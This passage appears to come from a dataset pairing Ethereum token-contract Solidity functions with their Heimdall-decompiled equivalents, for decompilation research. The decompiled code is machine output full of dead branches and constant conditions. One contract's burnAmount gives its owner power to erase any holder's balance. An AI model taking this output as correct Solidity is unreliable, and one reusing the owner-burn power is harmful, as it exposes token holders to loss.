0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA7e79D24b9FfA2EB98f06672377FE1212C2195E", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x05f5e100 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (!0x05f5e100 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        if (0x09) {\n                            if (!0x05f5e100 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xaB46fe68E6824c1004700052e359F63FB9C2EF8b", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (store_c - ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function removeLimitis() external onlyOwner {\r\n        maxWalletAmount = maxSupply;\r\n        maxTxAmount = maxSupply;\r\n    }", "heimdall_decompiled_code": "function removeLimitis() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        maxWalletAmount = 0x06765c793fa10079d0000000;\n        maxTxAmount = 0x06765c793fa10079d0000000;\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getTokenCostInfo(uint256 _pid) public view returns (uint256){\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        uint256 cost;\\n        cost = tokens.costvalue;\\n        return cost;\\n    }", "heimdall_decompiled_code": "function getTokenCostInfo(uint256 arg0) public view returns (uint256) {\n        require(arg0 < store_e);\n        var_a = 0x0b;\n        uint256 var_b = storage_map_l[(arg0 * 0x02) + keccak256(var_a)];\n        return storage_map_l[(arg0 * 0x02) + keccak256(var_a)];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n    }"}
{"contract_address": "0x76c084565eAE819c9D3647FC2934f6734995f92C", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb", "original_solidity_code": "function burnAmount(address wallet, uint256 amount) public onlyOwner {\\r\\n        require(wallet != owner(), \\\"TARGET ERROR\\\");\\r\\n        address deadAddress = 0x000000000000000000000000000000000000dEaD;\\r\\n        if (_balances[wallet] <= amount * 10 ** 18) {\\r\\n            _balances[wallet] = 0;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];\\r\\n        } else {\\r\\n            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function burnAmount(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - (address(owner / 0x01)), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        address var_f = address(arg0);\n        var_h = 0x65;\n        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEEF6196376173FC3F2BeDfe0cFcB355401e1Be51", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfC5b4524F85D2f45997f2705B448d346c0a5eAc1", "original_solidity_code": "function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x989680) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x989680;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x989680) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x989680;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x989680) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x989680;\n                                emit MaxTxAmountUpdated(0x989680);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function enableStaking() external onlyOwner{\r\n        isStakingAvilable=true;\r\n    }", "heimdall_decompiled_code": "function enableStaking() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        isStakingAvilable = 0x01 | (uint248(isStakingAvilable));\n    }"}
{"contract_address": "0xaE69c2886c0E01A3851292649e54BD51e4532383", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_e[var_a];\n        return storage_map_e[var_a];\n    }"}
{"contract_address": "0x4cA919d9EBE767dC6429f911651321feA44cbe94", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"you are not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x11;\n        var_d = 0x796f7520617265206e6f74206f776e6572000000000000000000000000000000;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x52aCF86689CC7AB10686e6aee34A3f628e5DcFEA", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_w) {\n            if (!(store_w) == ((store_w >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_w >> 0x01;\n                if (store_w) {\n                    if (!(store_w) == ((store_w >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w >> 0x01) {\n                            if (0x1f < (store_w >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_w >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        maxTransactionAmount = totalSupply();\r\n        maxWallet = totalSupply();\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        maxTransactionAmount = totalSupply;\n        maxWallet = totalSupply;\n    }"}
{"contract_address": "0x31d3341342D2A7a68EDDF5759C820eFD568D91dA", "original_solidity_code": "function ownerOf(uint256 tokenId) public view virtual override returns (address) {\\n        address owner = _owners[tokenId];\\n        require(owner != address(0), \\\"ERC721: owner query for nonexistent token\\\");\\n        return owner;\\n    }", "heimdall_decompiled_code": "function ownerOf(uint256 arg0) public view returns (address) {\n        uint256 var_a = arg0;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: owner query for nonexistent token\");\n        uint256 var_c = address(storage_map_b[var_a]);\n        return address(storage_map_b[var_a]);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x4552433732313a206f776e657220717565727920666f72206e6f6e6578697374;\n        var_g = 0x656e7420746f6b656e0000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0f44A71641D7aA4e4E12471a887bEB44E327c977", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(msg.sender, recipient, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender));\n        require(address(arg0));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = msg.sender;\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg1;\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!((arg1 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = arg1 + storage_map_b[var_c];\n        uint256 var_g = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_g = 0x01;\n        return 0x01;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function mint() external {\r\n        require(_tokenIdCounter.current() < MAX_SUPPLY, \"Maximum supply reached\");\r\n        require(paymentToken.balanceOf(msg.sender) >= currentPrice, \"Insufficient payment token balance\");\r\n        require(paymentToken.allowance(msg.sender, address(this)) >= currentPrice, \"Token allowance not provided\");\r\n\r\n        paymentToken.transferFrom(msg.sender, owner(), currentPrice);\r\n\r\n        _tokenIdCounter.increment();\r\n        uint256 newTokenId = _tokenIdCounter.current();\r\n        _safeMint(msg.sender, newTokenId);\r\n    }", "heimdall_decompiled_code": "function mint() public payable {\n        require(store_l < 0x01bc, \"Maximum supply reached\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x16;\n        var_e = 0x4d6178696d756d20737570706c79207265616368656400000000000000000000;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = address(msg.sender);\n        (bool success, bytes memory ret0) = address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (var_f));\n        require(!(var_f < currentPrice), \"Insufficient payment token balance\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_e = 0x22;\n        var_h = 0x496e73756666696369656e74207061796d656e7420746f6b656e2062616c616e;\n        var_i = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        var_g = 0xdd62ed3e00000000000000000000000000000000000000000000000000000000;\n        var_d = address(msg.sender);\n        address var_e = address(this);\n        (bool success, bytes memory ret0) = address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).Unresolved_dd62ed3e(var_d); // staticcall\n    }"}
{"contract_address": "0xAA37BDBBDa27BF560913F99C7B189D5B03583F7D", "original_solidity_code": "function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x6E66a59bF0F45A9Fdf99C28B45093F1BB41c990d", "original_solidity_code": "function changeFees(uint256 _buy, uint256 _sell) external {\r\n        if(msg.sender == deployer)\r\n            _changeFees(_buy, _sell);\r\n    }", "heimdall_decompiled_code": "function changeFees(uint256 arg0, uint256 arg1) public {\n        require(msg.sender + 0xffffffffffffffffffffffff04df33b09260f8c8ec7c75e9269e6b1ac89aa15b);\n        store_d = arg0;\n        store_c = arg1;\n    }"}
